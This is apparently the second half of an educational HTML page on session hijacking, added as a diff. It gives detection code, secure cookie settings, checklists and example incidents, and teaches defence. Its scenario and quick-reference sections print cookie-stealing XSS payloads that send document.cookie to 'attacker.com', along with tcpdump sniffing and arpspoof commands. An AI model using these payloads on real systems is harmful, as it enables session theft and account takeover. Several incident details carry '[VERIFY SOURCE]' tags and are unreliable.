+<pre><code class="language-python"># Server-side monitoring
+def detect_session_anomaly(session, request):
+    warnings = []
+    
+    # Check for sudden IP change
+    if session.get('last_ip') != request.remote_addr:
+        warnings.append(f"IP changed: {session.get('last_ip')} → {request.remote_addr}")
+    
+    # Check for User-Agent change
+    if session.get('user_agent') != request.user_agent.string:
+        warnings.append("User-Agent changed")
+    
+    # Check for impossible time travel
+    if session.get('last_location') and session.get('current_location'):
+        # If user was in New York 5 min ago, can't be in Tokyo now
+        if impossible_travel(session['last_location'], session['current_location']):
+            warnings.append("Impossible travel detected")
+    
+    # Check concurrent sessions from different locations
+    active_sessions = get_user_active_sessions(session['user_id'])
+    if len(active_sessions) > 3:
+        warnings.append(f"Multiple concurrent sessions: {len(active_sessions)}")
+    
+    if warnings:
+        log_security_event(session['user_id'], warnings)
+        # Optional: Force re-authentication
+        return False
+    
+    return True
+</code></pre>
+
+<h4>SIEM Integration</h4>
+<pre><code class="language-python"># Log session events for SIEM analysis
+import logging
+import json
+
+def log_session_event(event_type, session, request):
+    event = {
+        'timestamp': datetime.utcnow().isoformat(),
+        'event_type': event_type,
+        'user_id': session.get('user_id'),
+        'session_id': session.get('id'),
+        'ip_address': request.remote_addr,
+        'user_agent': request.user_agent.string,
+        'location': get_geolocation(request.remote_addr)
+    }
+    
+    logging.info(json.dumps(event))
+
+# Events to log:
+# - session_created
+# - session_hijack_suspected
+# - session_expired
+# - session_destroyed
+# - concurrent_session_detected
+</code></pre>
+
+        </div>
+        
+        <div class="content-section" id="section-6">
+            <h2>Real-World Examples</h2>
+
+<h3>Notable Breaches & Incidents</h3>
+
+<h4>1. Firesheep WiFi Hijacking (2010)</h4>
+<ul>
+    <li><strong>Impact:</strong> Demonstrated session hijacking on public WiFi networks</li>
+    <li><strong>Method:</strong> Browser extension captured unencrypted session cookies from HTTP traffic</li>
+    <li><strong>Affected:</strong> Facebook, Twitter, Amazon, and many sites not using HTTPS [VERIFY SOURCE]</li>
+    <li><strong>Outcome:</strong> Accelerated adoption of HTTPS-everywhere policies</li>
+</ul>
+
+<h4>2. GitHub Session Token Leak (2013)</h4>
+<ul>
+    <li><strong>Impact:</strong> Session tokens exposed in public repository</li>
+    <li><strong>Method:</strong> Developers accidentally committed session tokens to public repos [VERIFY SOURCE]</li>
+    <li><strong>Lesson:</strong> Never store session tokens in version control, logs, or URLs</li>
+</ul>
+
+<h4>3. Cloud Infrastructure Hijacking via Session Tokens</h4>
+<ul>
+    <li><strong>Impact:</strong> AWS/Azure session tokens stolen from compromised CI/CD pipelines</li>
+    <li><strong>Method:</strong> Credentials and session tokens leaked in build logs [VERIFY SOURCE]</li>
+    <li><strong>Result:</strong> Unauthorized access to cloud resources, data exfiltration</li>
+</ul>
+
+<h4>4. Banking Trojan Session Hijacking (2018-2020)</h4>
+<ul>
+    <li><strong>Impact:</strong> Multiple banking institutions targeted</li>
+    <li><strong>Method:</strong> Browser-based malware (TrickBot, Emotet) stealing session cookies [VERIFY SOURCE]</li>
+    <li><strong>Technique:</strong> Man-in-the-browser attacks bypassing 2FA by stealing active sessions</li>
+</ul>
+
+<h4>5. OAuth Token Theft via XSS (Various)</h4>
+<ul>
+    <li><strong>Impact:</strong> OAuth access tokens stolen via XSS vulnerabilities</li>
+    <li><strong>Method:</strong> Stored XSS in profile fields, message boards, comments</li>
+    <li><strong>Example:</strong> Slack, Discord bot tokens exposed via XSS [VERIFY SOURCE]</li>
+</ul>
+
+<h3>Common Vulnerable Scenarios</h3>
+
+<h4>Scenario 1: Coffee Shop WiFi Attack</h4>
+<pre><code># Attack flow:
+1. Victim connects to public WiFi
+2. Attacker performs ARP spoofing (MITM position)
+3. Victim visits HTTP site or attacker strips SSL
+4. Attacker captures session cookie with Wireshark
+5. Attacker replays cookie to access victim's account
+
+# Real example: E-commerce checkout session hijacked
+# Attacker changes shipping address and completes purchase
+</code></pre>
+
+<h4>Scenario 2: XSS in Forum Application</h4>
+<pre><code class="language-html">&lt;!-- Attacker posts in forum: --&gt;
+&lt;img src=x onerror="fetch('https://attacker.com/steal?c='+document.cookie)"&gt;
+
+&lt;!-- Victims viewing the post have sessions stolen --&gt;
+&lt;!-- Attacker uses stolen admin session to: --&gt;
+&lt;!-- - Access admin panel --&gt;
+&lt;!-- - Download user database --&gt;
+&lt;!-- - Plant backdoor --&gt;
+</code></pre>
+
+<h4>Scenario 3: Mobile App Session Token in URL</h4>
+<pre><code># Mobile app uses token in URL:
+myapp://dashboard?token=abc123xyz
+
+# Issues:
+1. Token visible in browser history
+2. Leaked via Referer header when clicking external links
+3. Captured in analytics/logging systems
+4. Shared accidentally via screenshots/screen sharing
+
+# Attack: Social engineering to get victim to share screenshot
+# Result: Permanent account access
+</code></pre>
+
+<h4>Scenario 4: API Session Leak in Logs</h4>
+<pre><code class="language-python"># Vulnerable logging
+import logging
+
+@app.route('/api/data')
+def get_data():
+    token = request.headers.get('Authorization')
+    
+    # ❌ BAD: Token logged
+    logging.info(f"Request received with token: {token}")
+    
+    # Logs stored in:
+    # - Application log files
+    # - Centralized logging (CloudWatch, Splunk)
+    # - Error tracking (Sentry)
+    # - APM tools (New Relic, DataDog)
+    
+    # Attack: Attacker gains access to logs → steals tokens
+</code></pre>
+
+<h3>Bug Bounty Examples</h3>
+
+<p>Common session hijacking vulnerabilities found in bug bounty programs [VERIFY SOURCE]:</p>
+
+<ul>
+    <li><strong>Missing HttpOnly:</strong> $500-$2,500 depending on impact</li>
+    <li><strong>Session fixation:</strong> $1,000-$5,000</li>
+    <li><strong>XSS leading to cookie theft:</strong> $2,000-$10,000+</li>
+    <li><strong>Session token in URL:</strong> $500-$2,000</li>
+    <li><strong>Weak session generation:</strong> $1,000-$5,000</li>
+</ul>
+
+        </div>
+        
+        <div class="content-section" id="section-7">
+            <h2>Quick Reference</h2>
+
+<h3>Attack Vectors Summary</h3>
+<pre><code># 1. XSS-based Cookie Theft
+&lt;script&gt;fetch('//attacker.com?c='+document.cookie)&lt;/script&gt;
+
+# 2. Network Sniffing (HTTP)
+tcpdump -i eth0 -A | grep "Cookie:"
+
+# 3. Session Fixation
+http://site.com/login?sessionid=ATTACKER_CONTROLLED
+
+# 4. MITM Attack
+arpspoof -i eth0 -t VICTIM_IP GATEWAY_IP
+
+# 5. Malicious Browser Extension
+chrome.cookies.getAll({}, cookies => exfiltrate(cookies))
+
+# 6. Session Token Prediction
+session_id = md5(user_id + timestamp)  # Predictable!
+
+# 7. Token Leakage via Referer
+http://site.com/page?session=TOKEN → External site sees Referer
+
+# 8. Session Riding (without stealing)
+fetch('/api/transfer', {credentials: 'include', body: {...}})
+</code></pre>
+
+<h3>Defense Checklist</h3>
+<ul>
+    <li>☐ Set HttpOnly flag on session cookies</li>
+    <li>☐ Set Secure flag (HTTPS only)</li>
+    <li>☐ Set SameSite=Strict or SameSite=Lax</li>
+    <li>☐ Use cryptographically random session tokens (32+ bytes)</li>
+    <li>☐ Regenerate session ID after login/privilege change</li>
+    <li>☐ Implement session timeout (idle + absolute)</li>
+    <li>☐ Bind sessions to user fingerprint (IP, User-Agent, etc.)</li>
+    <li>☐ Enforce HTTPS site-wide (HSTS)</li>
+    <li>☐ Implement proper XSS prevention (CSP, input validation)</li>
+    <li>☐ Store sessions server-side, not in URL parameters</li>
+    <li>☐ Implement logout functionality that destroys sessions</li>
+    <li>☐ Monitor for session anomalies (IP changes, concurrent sessions)</li>
+    <li>☐ Never log session tokens</li>
+    <li>☐ Implement re-authentication for sensitive operations</li>
+    <li>☐ Consider token rotation for long-lived sessions</li>
+</ul>
+
+<h3>Testing Checklist</h3>
+<ul>
+    <li>☐ Verify HttpOnly flag on cookies (DevTools Network tab)</li>
+    <li>☐ Verify Secure flag on cookies</li>
+    <li>☐ Test SameSite configuration (cross-origin requests)</li>
+    <li>☐ Analyze session token entropy (Burp Sequencer)</li>
+    <li>☐ Test session fixation (token changes after login?)</li>
+    <li>☐ Test session timeout (idle + absolute)</li>
+    <li>☐ Test concurrent session handling</li>
+    <li>☐ Test session invalidation on logout</li>
+    <li>☐ Check for tokens in URLs, logs, errors</li>
+    <li>☐ Test XSS vulnerabilities (can lead to session theft)</li>
+    <li>☐ Test HTTPS enforcement (HSTS headers)</li>
+    <li>☐ Review session binding mechanisms</li>
+</ul>
+
+<h3>Secure Cookie Configuration Examples</h3>
+
+<pre><code class="language-python"># Python Flask
+app.config.update(
+    SESSION_COOKIE_HTTPONLY=True,
+    SESSION_COOKIE_SECURE=True,
+    SESSION_COOKIE_SAMESITE='Strict',
+    PERMANENT_SESSION_LIFETIME=timedelta(hours=1)
+)
+</code></pre>
+
+<pre><code class="language-javascript">// Node.js Express
+app.use(session({
+  name: 'sessionId',
+  secret: process.env.SESSION_SECRET,
+  cookie: {
+    httpOnly: true,
+    secure: true,
+    sameSite: 'strict',
+    maxAge: 3600000  // 1 hour
+  },
+  resave: false,
+  saveUninitialized: false
+}));
+</code></pre>
+
+<pre><code class="language-php">// PHP
+session_set_cookie_params([
+    'lifetime' => 3600,
+    'path' => '/',
+    'domain' => '.example.com',
+    'secure' => true,
+    'httponly' => true,
+    'samesite' => 'Strict'
+]);
+session_start();
+</code></pre>
+
+<pre><code class="language-java">// Java Servlet
+Cookie sessionCookie = new Cookie("JSESSIONID", sessionId);
+sessionCookie.setHttpOnly(true);
+sessionCookie.setSecure(true);
+sessionCookie.setMaxAge(3600);
+sessionCookie.setPath("/");
+response.addCookie(sessionCookie);
+</code></pre>
+
+<h3>Common Session Management Patterns</h3>
+
+<pre><code class="language-python"># Pattern 1: Database-backed sessions
+class SessionManager:
+    def create_session(self, user_id):
+        session_token = secrets.token_urlsafe(32)
+        
+        db.sessions.insert({
+            'token': session_token,
+            'user_id': user_id,
+            'created_at': datetime.utcnow(),
+            'last_activity': datetime.utcnow(),
+            'ip_address': request.remote_addr,
+            'user_agent': request.user_agent.string
+        })
+        
+        return session_token
+    
+    def validate_session(self, session_token):
+        session = db.sessions.find_one({'token': session_token})
+        
+        if not session:
+            raise InvalidSession()
+        
+        # Check expiration
+        if datetime.utcnow() - session['last_activity'] > timedelta(minutes=30):
+            db.sessions.delete_one({'token': session_token})
+            raise SessionExpired()
+        
+        # Update activity
+        db.sessions.update_one(
+            {'token': session_token},
+            {'$set': {'last_activity': datetime.utcnow()}}
+        )
+        
+        return session['user_id']
+    
+    def destroy_session(self, session_token):
+        db.sessions.delete_one({'token': session_token})
+</code></pre>
+
+<h3>Resources</h3>
+<ul>
+    <li><a href="https://owasp.org/www-community/attacks/Session_hijacking_attack">OWASP Session Hijacking</a></li>
+    <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html">OWASP Session Management Cheat Sheet</a></li>
+    <li><a href="https://portswigger.net/web-security/authentication/session-management">PortSwigger Session Management</a></li>
+    <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies">MDN Web Docs: HTTP Cookies</a></li>
+    <li><a href="https://cwe.mitre.org/data/definitions/384.html">CWE-384: Session Fixation</a></li>
+</ul>
+
+<div class="success-box">
+    <h4><i class="fas fa-shield-alt"></i> Key Takeaways</h4>
+    <ul>
+        <li>Always use <strong>HttpOnly, Secure, and SameSite</strong> cookie flags</li>
+        <li>Generate <strong>cryptographically random</strong> session tokens</li>
+        <li><strong>Regenerate session IDs</strong> after authentication and privilege changes</li>
+        <li>Implement <strong>session timeouts</strong> (both idle and absolute)</li>
+        <li>Enforce <strong>HTTPS everywhere</strong> with HSTS</li>
+        <li>Prevent <strong>XSS</strong> as it's the #1 vector for session theft</li>
+        <li>Monitor for <strong>anomalous session activity</strong></li>
+        <li>Never store session tokens in URLs, logs, or client-side storage</li>
+    </ul>
+</div>
+
+        </div>
+        
+    </div>
+    
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-python.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-java.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-php.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-javascript.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-bash.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/components/prism-http.min.js"></script>
+</body>
+</html>
+
+<!--
+TODO: VERIFICATION ITEMS
+- [ ] Verify Firesheep 2010 timeline and impact statistics
+- [ ] Verify GitHub session token leak incident details (2013)
+- [ ] Verify cloud infrastructure session hijacking case studies
+- [ ] Verify banking trojan session hijacking statistics (TrickBot, Emotet)
+- [ ] Verify OAuth token theft via XSS examples (Slack, Discord)
+- [ ] Verify bug bounty payout ranges for session hijacking vulnerabilities
+- [ ] Verify statistics on session hijacking role in data breaches
+- [ ] Cross-check cookie security flag recommendations with latest OWASP guidelines
+- [ ] Verify session binding best practices and limitations
+- [ ] Verify recommended session timeout values (idle and absolute)
+- [ ] Review and validate all code examples for security best practices
+- [ ] Ensure all external resource links are current and accessible
+-->
